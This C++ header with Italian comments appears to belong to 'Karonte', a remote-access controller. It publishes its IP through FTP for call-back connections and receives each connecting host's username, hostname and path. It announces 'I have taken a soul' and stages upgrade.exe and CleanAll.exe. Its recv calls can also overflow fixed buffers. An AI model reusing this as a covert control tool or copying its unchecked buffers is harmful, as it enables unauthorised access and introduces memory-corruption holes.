/* 
 * File:   Init.h
 * Author: redo86
 *
 * Created on 3 luglio 2010, 19.34
 */

#ifndef INIT_H
#define	INIT_H
#endif	/* INIT_H */

#define MAX_COMPUTERNAME_LENGTH 255
#define MAX_PATH 255
#define PLAYER "mplayer"


#include<iostream>
#include <stdlib.h>

using namespace std;
char Username[MAX_COMPUTERNAME_LENGTH];
char Hostname[MAX_COMPUTERNAME_LENGTH];
char path[MAX_PATH];
string DirSettings;//contiene il path della cartella settings
string UserDir; //contiene la directory dove si trova la cartella Karonte


#include "Graphics.h"
#include "File.h" //inclusa per fare uso di alcune funzioni sui file




void PushIphone(void);
void WelcomeMaster(void);
void InitClient(void);
void GetUserRoot(void);
void InitUser(void);
void InitKaronte(void);
void ResetKaronte(bool);


//deve essere presente sul pc il pacchetto deb push-notify
void PushIphone(){       
    system("<Push notify> \'Karonte:\' \'Master I have taken a soul for you!!\'");

}
//riproduce suono di ingresso
void WelcomeMaster(){
    string lunch=PLAYER;
    lunch+=" ";
    lunch+=DirSettings;
    lunch+="master.mp3";
     system(lunch.c_str());
}

void ResetKaronte(bool choose){
     if(choose==false)send(cl_sk,"logouthalf",10,0);
     if(choose==true)send(cl_sk,"outdos",6,0);
     chdir("..");
     chdir("..");
     close(cl_sk);
     close(sk);     

     *Username='\0';
     *path='\0';
     *Hostname='\0';

     system("clear");
     InitKaronte();
     return;
}

//inizializza le impostazioni iniziali del client
void InitClient(){
    char *home;
    HeaderWindow();
    // se non è stato indicato un path preferenziale seleziono la home utente
    if(!Set)
    {
        home=getenv ("HOME");
        UserDir= home;
    }

     DirSettings=UserDir;
     DirSettings+="/.Karonte/Settings/";
     string dir=UserDir + "/.Karonte/";
     string file=DirSettings;
     file+="master.mp3";
     FILE *fp;
  
     //creo le cartelle se non estono
     mkdir(dir.c_str(),S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);//creo la cartella base Karonte
                                                              //NON ci sono controlli di errori, tanto in caso lo vedo dopo
     
     //se il file master.mp3 non esiste vuol dire che è la prima volta che si avvia karonte
     if((fp=fopen(file.c_str(),"rb"))==NULL){          
        //creo la cartella settings       
        cout<<endl<<endl<<" * E' la prima volta che si avvia Karonte, oppure non tutti i file di configurazione sono presenti."<<endl<<"Copia dei file necessari in corso...";
        if((mkdir(DirSettings.c_str(),S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH))==-1){
            cout<<endl<<endl<<"AVVISO:"<<endl<<"La cartella Settings di Karonte e' gia' presente in "<<UserDir<<"/Karonte/ ?[s/n]: ";
            if(getchar()!='s')
            {
                system("clear");
                cout<<endl;
                HeaderWindow();
                cout<<endl<<"ERRORE: Impossibile creare la cartella Karonte in "<<UserDir<<endl<<"Assicurarsi di avere i permessi necessari, quindi riavviare il Client."<<endl;
                cout<<"Chiusura in corso"<<endl<<"Premere Invio per terminare..."<<endl;
                getchar();
                exit(0);
            }
        }
        int code=copyLocalFile("Settings/master.mp3",file);
       
        if(code==-1){
            cout<<endl<<"AVVISO: Impossibile trovare la cartella Settings!"<<endl<<"Assicurarsi che sia nella stessa directory del client Karonte se è la prima volta che viene avviato."<<endl<<"Non sarà possibile udire alcun suono alla connessione del client, o fare l'upgrade; consultare il file README per maggiori informazioni"<<endl<<endl;
            return;
        }

        if(code==-2){
            cout<<endl<<"ERRORE: Non si hanno i permessi in scrittura nella directory "<<UserDir<<". Indicare un diverso percorso!"<<endl<<endl<<"Premere Invio per terminare "<<endl;
            getchar();
            exit(0);

        }  
        file=DirSettings;
        file+="upgrade.exe";
        copyLocalFile("Settings/upgrade.exe",file);
        file=DirSettings;
        file+="CleanAll.exe";
        copyLocalFile("Settings/CleanAll.exe",file);        
        return;
     }
     fclose(fp);
     return;
    
}
void LunchImage(){
    /*string exe=VIEWSOFT;
    exe+=" image/lunch.jpg";
    system(exe.c_str());
    */
}



//creo la cartella di base

void GetUserRoot(){    
     Path_User_Directory= UserDir;
     Path_User_Directory+="/.Karonte/";
     Path_User_Directory+= Hostname;
     mkdir(Path_User_Directory.c_str(),S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
     chdir(Path_User_Directory.c_str());
     return;

}


void InitUser(){
     int fine=0;
     char ch;
     string title;

     fine=recv(cl_sk,Username,MAX_COMPUTERNAME_LENGTH +1,0);
     Username[fine] = '\0';
     send(cl_sk,"0",1,0);
     fine=recv(cl_sk,Hostname,MAX_COMPUTERNAME_LENGTH +1,0);
     Hostname[fine] = '\0';
     GetUserRoot();
     send(cl_sk,"0",1,0);
     fine=recv(cl_sk,path,MAX_PATH,0);
     path[fine]='\0';

    //lancio il suono per l'avvenuta connessione ed in caso la notifica all'iphone
     if(Iphone)PushIphone();
     WelcomeMaster();
     system("clear");

     title=Hostname;
     title+=" connesso";
     setTitle(title);

     //Scelta di connessione dell'utente
     /********************/
     
     SoulKaronte();//menu della scelta della connessione
     ch=mygetch();

     //in caso di rifiuto temporaneo della connessione
     if(ch=='r'){
        ResetKaronte(false);
        return;
     }

     //in caso di chiusura fino al prossimo riavvio del server
     if(ch=='c'){
        cout<<endl<<"ATTENZIONE"<<endl<<"La connessione con l'utente "<<Username<<" sara\' disponibile solo al prossimo riavvio dell'host."<<endl;
        cout<<"Procedere?[s/n]";
        ch=mygetch();
        if(ch=='s')
        {
            ResetKaronte(true);
            return;
        }
     }
         
     system("clear");     
     /*******************/

     cout<<"Hostname: "<<"<"<<Hostname<<"> :Master i'm here to serve you."<<endl<<endl;
     cout<<path<<">";

     return;
}

void InitKaronte(){
    //inizializza le directory del client
    InitClient();

    //Menu a scelta
    Menu();

    //ricevo l'ip
    cout<<" * Controllo Ip in corso...";
    GetOwnIp();

    if(ContrIp()){
        cout<<endl<<" * Upload Ip in corso...";
        //carico sul server ftp il file contenente l'ip
        uploadCallme();
    }
    //aspetto connessioni
    connectServer();

    //inizializzo l'user appena connesso
    InitUser();

    return;
}
